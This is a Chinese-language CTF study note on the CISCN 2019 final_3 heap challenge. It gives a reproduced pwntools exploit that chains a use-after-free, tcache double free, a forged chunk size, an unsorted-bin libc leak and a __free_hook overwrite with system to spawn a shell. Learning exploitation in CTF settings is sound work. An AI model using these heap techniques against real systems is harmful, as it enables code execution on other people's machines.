---
title: "ciscn2019final3"
date: 2026-11-25 10:02:11
categories:
  - "题目复现"
  - "CISCN"
tags: ["unsorted-bin", "UAF", "double-free", "free-hook", "堆风水", "glibc2.27"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#11 -->
[ciscn2019_final_3 writeup | xia0ji233's blog](https://xia0ji233.pro/2021/11/01/ciscn2019_final_3 writeup/)

[ciscn_2019_final_3 需要避开当前free的chunk的下一个chunk不能超过arena的边界 - PYozo_free - 博客园](https://www.cnblogs.com/pppyyyzzz/p/14040210.html)

![image-20261111162627147](/pwn-notes/images/notes/image-20261111162627147.png)

啥意思？

![image-20261111163710390](/pwn-notes/images/notes/image-20261111163710390.png)



















这道题还是用来巩固tcache机制

只有两个功能，一个add 一个remove

![image-20261110181432908](/pwn-notes/images/notes/image-20261110181432908.png)

![image-20261110181956571](/pwn-notes/images/notes/image-20261110181956571.png)

并没有进行指针清零

uaf

检查保护

![image-20261110182057997](/pwn-notes/images/notes/image-20261110182057997.png)

依旧全开，需要泄露libc地址

可是add函数限制了大小

![image-20261110182900882](/pwn-notes/images/notes/image-20261110182900882.png)

他这里给的礼物是堆地址

![image-20261110182940808](/pwn-notes/images/notes/image-20261110182940808.png)

还有tcachebin

```bash
patchelf --set-interpreter /home/nan/桌面/pwn/2.27-3ubuntu1_amd64/ld-2.27.so ./pwn
patchelf --set-rpath /home/nan/桌面/pwn/2.27-3ubuntu1_amd64 ./pwn
```

忘了修改了

上一题是可以修改counts数组里面的值，然后申请大块进而释放

可是这个限制大小就只是0x80

那就去修改一个chunk的size域

![image-20261110190608335](/pwn-notes/images/notes/image-20261110190608335.png)

怎么修改size?没有溢出

那就把指针改到size字段哪个位置，之后的话，直接申请在修改

![image-20261110193416890](/pwn-notes/images/notes/image-20261110193416890.png)

首先这个地址接受的是字符串，之后转化一下

![image-20261110193801495](/pwn-notes/images/notes/image-20261110193801495.png)

及诶收好了，就是需要  int（p.recvline().strip(),16）

![image-20261110193934309](/pwn-notes/images/notes/image-20261110193934309.png)

连续释放两次之后

![image-20261110194223082](/pwn-notes/images/notes/image-20261110194223082.png)

修改到了chunk的开头，接下来继续申请

![image-20261110194858195](/pwn-notes/images/notes/image-20261110194858195.png)

连续申请并且修改其size字段

![image-20261110195156131](/pwn-notes/images/notes/image-20261110195156131.png)

可是还是没有绕过tcache机制们这里其实也可以修改其数量

原来还可以直接修改成超级大块，0x410

![image-20261110195759522](/pwn-notes/images/notes/image-20261110195759522.png)

妈的，偶改错了

![image-20261110195821351](/pwn-notes/images/notes/image-20261110195821351.png)

![image-20261110195936023](/pwn-notes/images/notes/image-20261110195936023.png)

哎呀，我去，doublefree的提示

没有在后面伪造块结构

那还不如直接修改大管家

![image-20261110200646023](/pwn-notes/images/notes/image-20261110200646023.png)







这一次，先修改的size大小

![image-20261110210233796](/pwn-notes/images/notes/image-20261110210233796.png)

接着修改大管家

妈的，改个但

第一次

```python
add(4,0x30,b'a')
p.recvuntil(b'gift :')
addr1=int(p.recvline().strip(),16)
print(addr1)
addr2=addr1-0x10
delete(4)

delete(4)

add(5,0x30,p64(addr2))
add(6,0x30,b'b')
add(7,0x30,p64(0)+p64(0x90))



add(0,0x50,b'a')
p.recvuntil(b'gift :')
addr=int(p.recvline().strip(),16)
print(addr)
heap_addr=addr-0x11eb0+0x10

delete(0)
delete(0)

add(1,0x50,p64(heap_addr))
add(2,0x50,b'b')
add(3,0x50,b'q'*0x10)

add(8,0x50,b'c')
```

写的啥，我刷哦罢了

## 复现别人exp

```python
from pwn import *

context.log_level='debug'
context.arch='amd64'
context.os='linux'
def conn(x,file_name,port):
    if x:
        p=process(file_name)
        libc=ELF('./libc/libc-2.27-64.so')
    else:
        p=remote('node4.buuoj.cn',port)
        libc=ELF('./libc/libc-2.27-buu64.so')
    return ELF(file_name),libc,p

def add(index,size,payload):
    p.sendlineafter(b'choice >',b'1')
    p.sendlineafter(b'index',str(index))
    p.sendlineafter(b'size',str(size))
    p.sendafter(b'something',payload)
    if index==11:return 
    p.recvuntil(b'0x')
    #if index==11:gdb.attach(p)
    return int(p.recvline()[:-1],16)

def free(index):
    p.sendlineafter(b'choice >',b'2')
    p.sendlineafter(b'index',str(index))

elf,libc,p=conn(0,'./ciscn_final_3',28019)
heap_addr=add(0,0x18,b'a'*0x8+p64(0))
free(0)
success('heap_addr:'+hex(heap_addr))
free(0)
#double free保存一个free的0x30堆块在0号堆块位置
add(1,0x18,p64(heap_addr-0x10))
add(2,0x18,b'/bin/sh\0')
add(3,0x18,b'\0'*8+p64(0x31))
free(0)
#free(0)

add(4,0x78,b'a'*0x78)
free(4)
free(4)
add(5,0x78,p64(heap_addr-0x10))
add(6,0x78,b'a')
add(7,0x78,p64(0)+p64(0xa1))#构造非fastbin大小的堆块
add(8,0x38,b'a')

for i in range(8):#填满tcache 使其落入unsorted bin
    free(0)
add(9,0x28,b'aa')
libc_addr=add(10,0x28,b'\0')-0x3ebca0#泄露libc地址
success('libc_addr:'+hex(libc_addr))

add(11,0x60,b'a')
free(11)
free(11)
add(12,0x60,p64(libc_addr+libc.sym['__free_hook']))#劫持freehook
add(13,0x60,b'a')
add(14,0x60,p64(libc_addr+libc.sym['system']))
add(15,0x18,b'/bin/sh\0')
free(15)#getshell
#gdb.attach(p)
p.interactive()
```

首先就是申请一个0x18看到的话就是0x20大小的堆块，然后

之后的话就是直接，double好像是保存了字符串还有又重新更改了一开始堆块的size字段

![image-20261111095531207](/pwn-notes/images/notes/image-20261111095531207.png)

一开始的doublefree

![image-20261111095621400](/pwn-notes/images/notes/image-20261111095621400.png)

![image-20261111095808122](/pwn-notes/images/notes/image-20261111095808122.png)

![image-20261111100151181](/pwn-notes/images/notes/image-20261111100151181.png)

这里已经进入到了doublfree的尾声，之后就直接修改堆块的size字段

![image-20261111100255823](/pwn-notes/images/notes/image-20261111100255823.png)

![image-20261111100410368](/pwn-notes/images/notes/image-20261111100410368.png)

这个就是修改完之后的

接下来free0?有什么用？

![image-20261111100642649](/pwn-notes/images/notes/image-20261111100642649.png)

这里的free0确实是把一开始的chunkfree掉了，或许就是因为

freeeeeeeeeeee

![image-20261111101237121](/pwn-notes/images/notes/image-20261111101237121.png)

![image-20261111101342496](/pwn-notes/images/notes/image-20261111101342496.png)

在这里确实是把它放进了0x30大小的堆块

接下来构造非fastbin大小的堆块

申请的是0x78大小的，也是限制最大的堆块

![image-20261111101751566](/pwn-notes/images/notes/image-20261111101751566.png)

不知从何时开始topchunk就没有了

居然是直接从98开始写的吗？

如果只是想将这个大堆块写入的话，那么成功了，也是double free

我靠，接下来是？直接到原来的堆块？

首先应该还是修改的是0x80大小的tcachebin链

![image-20261111103351892](/pwn-notes/images/notes/image-20261111103351892.png)

一开始是这样的

![image-20261111103505936](/pwn-notes/images/notes/image-20261111103505936.png)

在这里又是改成了60堆块

接下来就是修改size大小。

改的还是一开始那个改成0x30大小的堆块

？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？

![image-20261111103955795](/pwn-notes/images/notes/image-20261111103955795.png)

啥意思？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？

![image-20261111104528864](/pwn-notes/images/notes/image-20261111104528864.png)

之后又申请了一个0x40大小的堆块

然后现在就是已经把堆块大小改完了，还有

![image-20261111105238903](/pwn-notes/images/notes/image-20261111105238903.png)

怎么就突然释放进unsoretdbin了

![image-20261111105438336](/pwn-notes/images/notes/image-20261111105438336.png)

然后直接申请两个满足0x30大小的堆块，就可以得到Libc地址

![image-20261111110043008](/pwn-notes/images/notes/image-20261111110043008.png)

我靠，什么？

![image-20261111110606429](/pwn-notes/images/notes/image-20261111110606429.png)

难道这样可以直接读到bk指向的位置吗？？？？？？？？

MLB ,啥是堆风水，靠

最重要的没看懂，后面的就是再次doublefree 然后劫持free_hook,修改成system之后还有一开始写入的字符串，这样就

![image-20261111111138027](/pwn-notes/images/notes/image-20261111111138027.png)

这个版本通了，神了





## 第三次

![image-20261111170114923](/pwn-notes/images/notes/image-20261111170114923.png)

在这里确实是看到了复用机制

free unosretdbin大小堆块的机制

![image-20261111170658519](/pwn-notes/images/notes/image-20261111170658519.png)

所以在修改size之前是先创建了两个在其范围内的堆块

所以说这就是伪造堆块重叠，构造大堆块修改其size字段，之后，释放进入unsortedbin

![image-20261111171515245](/pwn-notes/images/notes/image-20261111171515245.png)

就像是这样

之后再添加一个堆块，防止合并在释放的时候

![image-20261111171824328](/pwn-notes/images/notes/image-20261111171824328.png)

在这里想添加一个0x18堆块失败

![image-20261111172011819](/pwn-notes/images/notes/image-20261111172011819.png)

添加一个0x30

之后应该就可以释放了

![image-20261111172148517](/pwn-notes/images/notes/image-20261111172148517.png)

free的时候没有报错

![image-20261111172311325](/pwn-notes/images/notes/image-20261111172311325.png)

接下来连续free8次之后，然后就进入unsoretdbin中了

那么接下来怎么泄露libc？

![image-20261111173323481](/pwn-notes/images/notes/image-20261111173323481.png)

这里free现在unsoretdbin中的0x80大小的堆块两次

效果：

![image-20261111173419392](/pwn-notes/images/notes/image-20261111173419392.png)

在一开始创建的时候犯了个错，

![image-20261111174903656](/pwn-notes/images/notes/image-20261111174903656.png)

之后回来再看，然后改完这个就可以了

![image-20261111174952499](/pwn-notes/images/notes/image-20261111174952499.png)

再连续申请两次就可以







## 第四次

首先创建4个0x60堆块，然后释放

![image-20261112184055300](/pwn-notes/images/notes/image-20261112184055300.png)

然后呢，就只是释放到了tcachebin中

接着又重新创建一个0x60大小堆块，接受堆地址

![image-20261112184445686](/pwn-notes/images/notes/image-20261112184445686.png)

![image-20261112184646033](/pwn-notes/images/notes/image-20261112184646033.png)

新获得的堆块地址距离堆块开头距离

它的开头又一个大小是0x250大小的堆块

然后又是删除chunk0两次

![image-20261112185339214](/pwn-notes/images/notes/image-20261112185339214.png)

这个只是删除一次之后

可是接下来删除第二次之后

![image-20261112185555454](/pwn-notes/images/notes/image-20261112185555454.png)

居然tcache链表中就只是剩下了70的链，其他的呢？

接下来申请一个0x60大小的，大小的利用其double free漏洞，修改其fd指针，指向堆的开头

![image-20261112190309214](/pwn-notes/images/notes/image-20261112190309214.png)

接下来就是修改其counts数组

```python
add(6,0x60,b'a')
payload=b'\x00'*0x20+b'\x07'*(64-0x20)+p64(heap+0x40)
add(7,0x60,payload)
```

连续申请，之后的话就直接

![image-20261112193209266](/pwn-notes/images/notes/image-20261112193209266.png)

可是那个payload到底干了什么？

这是payload没有写入之前，然后写入查看

![image-20261112193637327](/pwn-notes/images/notes/image-20261112193637327.png)

counts数组后面紧跟的就是entry数组

而且是tcache[0x20]的链表头

然后呢，改这里有什么用？

然后又把这个堆块删了

![image-20261112194124275](/pwn-notes/images/notes/image-20261112194124275.png)

啥情况啊？

![image-20261112194335050](/pwn-notes/images/notes/image-20261112194335050.png)

这个251是一开始就有的，之后的话如果是想的是想要释放相应大小的堆块的话，之后填充7的话，还是理解的，可是之后的，修改emtrys的数组改为40是干啥？

依旧unsoretdbin的切割

<!-- sync-hash: dbd091fdb4b44a94a0c5fca46c0940e4b00fbe9a4c32824a9f58b4e66de0ebe3 -->
